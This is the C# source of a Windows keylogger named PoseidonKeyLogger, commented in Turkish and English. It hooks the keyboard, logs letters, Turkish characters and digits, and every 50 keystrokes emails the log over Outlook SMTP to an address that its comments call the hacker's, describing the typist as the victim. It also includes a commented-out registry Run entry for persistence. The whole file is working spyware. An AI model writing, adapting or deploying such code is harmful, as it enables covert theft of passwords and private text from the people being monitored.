using System.Net.Mail;
using System.Runtime.InteropServices;
using Microsoft.Win32;
using HootKeys;

namespace PoseidonKeyLogger

{
   
    public partial class PoseidonKeyLogger : Form
    {
        public PoseidonKeyLogger()
        {
            InitializeComponent();
            ListenKey();
        }
        // BU KISIM ALINTIDIR.
        [DllImport("user32.dll")]
        static extern void keybd_event(byte bVk, byte bScan, uint dwFlags, UIntPtr dwExtraInfo);
        const int KEYEVENTF_EXTENDEDKEY = 0x1;
        const int KEYEVENTF_KEYUP = 0x2;
        //
        //Some parameters for conditions
        //Büyük küçük harf uyumu için ve log þablonu için bazý parametreler tanýmlýyorum.
        int number=0;
        string log = "Empty - ";
        bool BigChar = true;
        globalKeyboardHook keyBoard = new globalKeyboardHook();

                                 //FUNCTÝONS(FONKSÝYONLAR//
        //-------------------------------------------------------------------------------------------
        //-------------------------------------------------------------------------------------------


        //create function to send hacker's mail adress to victim's key logging.
        //kurbanýn klavye giriþlerini hackerin mail adresine gönderen fonksiyon.
        void Mail()
        {
            MailMessage msg = new MailMessage();
            SmtpClient hacker = new SmtpClient();
            hacker.Credentials = new System.Net.NetworkCredential("//outlook", "//outlooksifre");
            hacker.Port = 587;
            hacker.Host = "smtp.outlook.com";
            hacker.EnableSsl = true;
            SmtpClient server= new SmtpClient("outlook.com");
            
            

            msg.Body = log.ToString();
            msg.Subject = "#Log";
            msg.From = new MailAddress("//outlook");
            msg.To.Add("//gmail");
            hacker.Send(msg);


        }

        //Create Function for Listen key.
        //Klavyeyi dinlemek için fonksiyon oluþtur.
        void ListenKey()
        {
            //bu bölümdeki karakterler hazýr txt dosyasýndan çekilmiþtir!

            keyBoard.HookedKeys.Add(Keys.CapsLock);
            keyBoard.HookedKeys.Add(Keys.A);
            keyBoard.HookedKeys.Add(Keys.S);
            keyBoard.HookedKeys.Add(Keys.D);
            keyBoard.HookedKeys.Add(Keys.F);
            keyBoard.HookedKeys.Add(Keys.G);
            keyBoard.HookedKeys.Add(Keys.H);
            keyBoard.HookedKeys.Add(Keys.J);
            keyBoard.HookedKeys.Add(Keys.K);
            keyBoard.HookedKeys.Add(Keys.L);
            keyBoard.HookedKeys.Add(Keys.Z);
            keyBoard.HookedKeys.Add(Keys.X);
            keyBoard.HookedKeys.Add(Keys.C);
            keyBoard.HookedKeys.Add(Keys.V);
            keyBoard.HookedKeys.Add(Keys.B);
            keyBoard.HookedKeys.Add(Keys.N);
            keyBoard.HookedKeys.Add(Keys.M);
            keyBoard.HookedKeys.Add(Keys.Q);
            keyBoard.HookedKeys.Add(Keys.W);
            keyBoard.HookedKeys.Add(Keys.E);
            keyBoard.HookedKeys.Add(Keys.R);
            keyBoard.HookedKeys.Add(Keys.T);
            keyBoard.HookedKeys.Add(Keys.Y);
            keyBoard.HookedKeys.Add(Keys.U);
            keyBoard.HookedKeys.Add(Keys.I);
            keyBoard.HookedKeys.Add(Keys.O);
            keyBoard.HookedKeys.Add(Keys.P);

            //TURKÝSH CHARACTERS

            keyBoard.HookedKeys.Add(Keys.OemOpenBrackets);
            keyBoard.HookedKeys.Add(Keys.Oem6);
            keyBoard.HookedKeys.Add(Keys.Oem1);
            keyBoard.HookedKeys.Add(Keys.Oem7);
            keyBoard.HookedKeys.Add(Keys.OemQuestion);
            keyBoard.HookedKeys.Add(Keys.Oem5);

            //NUMBERS

            keyBoard.HookedKeys.Add(Keys.NumPad0);
            keyBoard.HookedKeys.Add(Keys.NumPad1);
            keyBoard.HookedKeys.Add(Keys.NumPad2);
            keyBoard.HookedKeys.Add(Keys.NumPad3);
            keyBoard.HookedKeys.Add(Keys.NumPad4);
            keyBoard.HookedKeys.Add(Keys.NumPad5);
            keyBoard.HookedKeys.Add(Keys.NumPad6);
            keyBoard.HookedKeys.Add(Keys.NumPad7);
            keyBoard.HookedKeys.Add(Keys.NumPad8);
            keyBoard.HookedKeys.Add(Keys.NumPad9);

            //FRONT NUMBERS

            keyBoard.HookedKeys.Add(Keys.D0);
            keyBoard.HookedKeys.Add(Keys.D1);
            keyBoard.HookedKeys.Add(Keys.D2);
            keyBoard.HookedKeys.Add(Keys.D3);
            keyBoard.HookedKeys.Add(Keys.D4);
            keyBoard.HookedKeys.Add(Keys.D5);
            keyBoard.HookedKeys.Add(Keys.D6);
            keyBoard.HookedKeys.Add(Keys.D7);
            keyBoard.HookedKeys.Add(Keys.D8);
            keyBoard.HookedKeys.Add(Keys.D9);

            //BACKSPACE DOT...
            keyBoard.HookedKeys.Add(Keys.OemPeriod);
            keyBoard.HookedKeys.Add(Keys.Back);





            keyBoard.KeyDown += new KeyEventHandler(KeyCombination);
        }

        //Create function(event function) for key Combination.
        //Yukarýdaki Klavye Dinleme(listenKey) fonksiyonunda tanýmlayamadýðýmýz harfleri tuþ kombinasyonu(KeyCombinationO fonksiyonunda kullanamayýz.
        void KeyCombination(object sender,KeyEventArgs e) 
        {

            if (number>50) 
            {
                Mail();
                number=0;
                log = "empty - ";
            }
            //Bu bölümdeki if else dönüleri hazýr txt dosyasýndan alýnmýþtýr!


            //büyük küçük harf uyumu için özel capslock koþulu.
            if (e.KeyCode == Keys.CapsLock)
            {
                if (BigChar == true)
                {
                    BigChar = false;
                }
                else
                {
                    BigChar = true;
                }
            }
            


            //dot , backspace vs
            if (e.KeyCode == Keys.OemPeriod)
            {

                log += ".";
                number++;
            }
            if (e.KeyCode == Keys.Back)
            {

                log += "*Back*";
                number++;
            }

            //numbers
            if (e.KeyCode == Keys.NumPad0 || e.KeyCode == Keys.D0)
            {

                log += "0";
                number++;
            }
            if (e.KeyCode == Keys.NumPad1 || e.KeyCode == Keys.D1)
            {

                log += "1";
                number++;
            }
            if (e.KeyCode == Keys.NumPad2 || e.KeyCode == Keys.D2)
            {

                log += "2";
                number++;
            }
            if (e.KeyCode == Keys.NumPad3 || e.KeyCode == Keys.D3)
            {

                log += "3";
                number++;
            }
            if (e.KeyCode == Keys.NumPad4 || e.KeyCode == Keys.D4)
            {

                log += "4";
                number++;
            }
            if (e.KeyCode == Keys.NumPad5 || e.KeyCode == Keys.D5)
            {

                log += "5";
                number++;
            }
            if (e.KeyCode == Keys.NumPad6 || e.KeyCode == Keys.D6)
            {

                log += "6";
                number++;
            }
            if (e.KeyCode == Keys.NumPad7 || e.KeyCode == Keys.D7)
            {

                log += "7";
                number++;
            }
            if (e.KeyCode == Keys.NumPad8 || e.KeyCode == Keys.D8)
            {

                log += "8";
                number++;
            }
            if (e.KeyCode == Keys.NumPad9 || e.KeyCode == Keys.D9)
            {

                log += "9";
                number++;
            }



            //turkish characters

            if (e.KeyCode == Keys.OemOpenBrackets)
            {
                if (BigChar == true)
                    log += "Ð";
                else
                    log += "ð";

                number++;
            }
            if (e.KeyCode == Keys.Oem6)
            {
                if (BigChar == true)
                    log += "Ü";
                else
                    log += "ü";

                number++;
            }
            if (e.KeyCode == Keys.Oem1)
            {
                if (BigChar == true)
                    log += "Þ";
                else
                    log += "þ";

                number++;
            }

            if (e.KeyCode == Keys.Oem7)
            {
                if (BigChar == true)
                    log += "Ý";
                else
                    log += "i";

                number++;
            }
            if (e.KeyCode == Keys.OemQuestion)
            {
                if (BigChar == true)
                    log += "Ö";
                else
                    log += "ö";

                number++;
            }
            if (e.KeyCode == Keys.Oem5)
            {
                if (BigChar == true)
                    log += "Ç";
                else
                    log += "ç";

                number++;
            }


            //ENTER BACKSPACE VS

            if (e.KeyCode == Keys.Enter)
            {
                log += " -enter- ";
                number++;
            }

            if (e.KeyCode == Keys.Space)
            {
                log += " ";
                number++;
            }


            //other characters


            if (e.KeyCode == Keys.A)
            {
                if (BigChar == true)
                    log += "A";
                else
                    log += "a";

                number++;
            }
            if (e.KeyCode == Keys.S)
            {
                if (BigChar == true)
                    log += "S";
                else
                    log += "s";

                number++;
            }
            if (e.KeyCode == Keys.D)
            {
                if (BigChar == true)
                    log += "D";
                else
                    log += "d";

                number++;
            }
            if (e.KeyCode == Keys.F)
            {

                if (BigChar == true)
                    log += "F";
                else
                    log += "f";

                number++;
            }
            if (e.KeyCode == Keys.G)
            {

                if (BigChar == true)
                    log += "G";
                else
                    log += "g";

                number++;
            }
            if (e.KeyCode == Keys.H)
            {

                if (BigChar == true)
                    log += "H";
                else
                    log += "h";

                number++;
            }
            if (e.KeyCode == Keys.J)
            {

                if (BigChar == true)
                    log += "J";
                else
                    log += "j";

                number++;
            }
            if (e.KeyCode == Keys.K)
            {

                if (BigChar == true)
                    log += "K";
                else
                    log += "k";

                number++;

            }
            if (e.KeyCode == Keys.L)
            {

                if (BigChar == true)
                    log += "L";
                else
                    log += "l";

                number++;
            }
            if (e.KeyCode == Keys.Z)
            {

                if (BigChar == true)
                    log += "Z";
                else
                    log += "z";

                number++;
            }
            if (e.KeyCode == Keys.X)
            {

                if (BigChar == true)
                    log += "X";
                else
                    log += "x";

                number++;
            }
            if (e.KeyCode == Keys.C)
            {

                if (BigChar == true)
                    log += "C";
                else
                    log += "c";

                number++;
            }
            if (e.KeyCode == Keys.V)
            {

                if (BigChar == true)
                    log += "V";
                else
                    log += "v";

                number++;
            }
            if (e.KeyCode == Keys.B)
            {

                if (BigChar == true)
                    log += "B";
                else
                    log += "b";

                number++;
            }
            if (e.KeyCode == Keys.N)
            {

                if (BigChar == true)
                    log += "N";
                else
                    log += "n";

                number++;
            }
            if (e.KeyCode == Keys.M)
            {

                if (BigChar == true)
                    log += "M";
                else
                    log += "m";

                number++;

            }
            if (e.KeyCode == Keys.Q)
            {

                if (BigChar == true)
                    log += "Q";
                else
                    log += "q";

                number++;
            }
            if (e.KeyCode == Keys.W)
            {

                if (BigChar == true)
                    log += "W";
                else
                    log += "w";

                number++;
            }
            if (e.KeyCode == Keys.E)
            {

                if (BigChar == true)
                    log += "E";
                else
                    log += "e";

                number++;
            }
            if (e.KeyCode == Keys.R)
            {

                if (BigChar == true)
                    log += "R";
                else
                    log += "r";

                number++;
            }
            if (e.KeyCode == Keys.T)
            {

                if (BigChar == true)
                    log += "T";
                else
                    log += "t";

                number++;
            }
            if (e.KeyCode == Keys.Y)
            {

                if (BigChar == true)
                    log += "Y";
                else
                    log += "y";

                number++;
            }
            if (e.KeyCode == Keys.U)
            {

                if (BigChar == true)
                    log += "U";
                else
                    log += "u";

                number++;
            }
            if (e.KeyCode == Keys.I)
            {

                if (BigChar == true)
                    log += "I";
                else
                    log += "ý";

                number++;
            }
            if (e.KeyCode == Keys.O)
            {

                if (BigChar == true)
                    log += "O";
                else
                    log += "o";

                number++;
            }
            if (e.KeyCode == Keys.P)
            {

                if (BigChar == true)
                    log += "P";
                else
                    log += "p";

                number++;
            }




        }


                                //FORM EVENTS AND CONTROLS(FORM OLAYLARI VE KONTROLLER(TEST))//
        //-------------------------------------------------------------------------------------------
        //-------------------------------------------------------------------------------------------



        //MessageBox Control for log(it can be delete).
        //klavyeden gelen stringi messageboxta gösterme fonksiyonu.
        //SÝLÝNECEK!!!
        // private void Form1_Click(object sender, EventArgs e)
        //{
        //  MessageBox.Show(log.ToString());
        //}


        //The function that prints to the lblCapsSit if the capslock pattern is on or off.
        //Capslock Tuþunun baþlangýçta hang durumda olduðunu yazdýran fonksiyon.
        private void Form1_Load(object sender, EventArgs e)
        {
            if (Control.IsKeyLocked(Keys.CapsLock))
            {
                BigChar = true;
                
            }
            else 
            {
                BigChar = false;
                
            }
            //Baþlangýça gömme kodu
            //RegistryKey key = Registry.CurrentUser.OpenSubKey(@"Software\Microsoft\Windows\CurrentVersion\Run", true);
            //key.SetValue("PoseidonKeyLogger", "\"" + Application.ExecutablePath + "\"");

        }

        private void label1_Click(object sender, EventArgs e)
        {

        }
    }
}